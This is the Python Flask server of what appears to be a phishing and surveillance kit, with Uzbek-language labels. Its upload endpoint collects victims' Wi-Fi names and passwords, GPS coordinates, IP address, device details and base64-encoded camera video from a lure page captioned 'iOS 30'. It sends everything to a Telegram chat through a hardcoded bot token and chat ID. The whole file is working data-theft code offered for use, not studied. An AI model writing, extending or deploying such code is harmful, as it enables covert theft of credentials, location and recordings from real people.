from flask import Flask, render_template, request
import telebot
import base64
import os
import time

app = Flask(__name__)
TOKEN = "8605118238:AAHrKwcPtCiduVmvaIRVUvLrfyCZQlFzALs"
CHAT_ID = "8424475786"
bot = telebot.TeleBot(TOKEN)

def parse_device(ua_string):
    ua = ua_string.lower()
    
    if 'iphone' in ua:
        device = 'Apple iPhone'
    elif 'ipad' in ua:
        device = 'Apple iPad'
    elif 'macintosh' in ua or 'mac os' in ua:
        device = 'Apple MacBook'
    elif 'android' in ua:
        if 'samsung' in ua:
            device = 'Samsung Galaxy'
        elif 'xiaomi' in ua or 'redmi' in ua:
            device = 'Xiaomi'
        elif 'huawei' in ua:
            device = 'Huawei'
        elif 'oppo' in ua:
            device = 'OPPO'
        elif 'vivo' in ua:
            device = 'Vivo'
        elif 'oneplus' in ua:
            device = 'OnePlus'
        elif 'pixel' in ua:
            device = 'Google Pixel'
        else:
            device = 'Android Qurilma'
    elif 'windows' in ua:
        device = 'Windows Kompyuter'
    else:
        device = 'Nomaʼlum Qurilma'
    
    if 'safari' in ua and 'chrome' not in ua:
        browser = 'Safari'
    elif 'chrome' in ua and 'edg' not in ua:
        browser = 'Chrome'
    elif 'firefox' in ua:
        browser = 'Firefox'
    elif 'edg' in ua:
        browser = 'Edge'
    else:
        browser = 'Boshqa'
    
    if 'android' in ua:
        try:
            ver = ua.split('android ')[1].split(';')[0].split('.')[0]
            os_name = f'Android {ver}'
        except:
            os_name = 'Android'
    elif 'iphone os' in ua or 'ios' in ua:
        os_name = 'iOS'
    elif 'mac os' in ua:
        os_name = 'macOS'
    elif 'windows' in ua:
        os_name = 'Windows'
    else:
        os_name = 'Boshqa'
    
    return f"{device} | {os_name} | {browser}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        ip = request.remote_addr
        ua_string = request.headers.get('User-Agent', '')
        wifi_name = str(data.get('wifiName', ''))
        wifi_pass = str(data.get('wifiPass', ''))
        lat = str(data.get('lat', ''))
        lon = str(data.get('lon', ''))
        device = parse_device(ua_string)

        print("=" * 50)
        print(f"wifiName: '{wifi_name}'")
        print(f"wifiPass: '{wifi_pass}'")
        print(f"video: {bool(data.get('video'))}")
        print("=" * 50)

        # Wi-Fi xabari
        if wifi_name and wifi_pass:
            wifi_msg = f"iOS 30\n\nWI-FI NOMI: {wifi_name}\nWI-FI PAROL: {wifi_pass}\nIP: {ip}"
            bot.send_message(CHAT_ID, wifi_msg)
            print("Wi-Fi xabari yuborildi")

        # Video
        if data.get('video'):
            video_data = base64.b64decode(data['video'].split(',')[1])
            filename = f"recording_{int(time.time())}.webm"
            with open(filename, 'wb') as f:
                f.write(video_data)

            caption = f"""iOS 30

QURILMA: {device}
WI-FI NOMI: {wifi_name}
WI-FI PAROL: {wifi_pass}
IP: {ip}
GPS: {lat}, {lon}
SANA: {time.strftime('%Y-%m-%d %H:%M:%S')}"""

            with open(filename, 'rb') as f:
                bot.send_video(CHAT_ID, f, caption=caption)
            os.remove(filename)
            print("Video yuborildi")

        return 'OK'
    except Exception as e:
        print(f"XATO: {e}")
        return 'Error', 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5050, debug=True)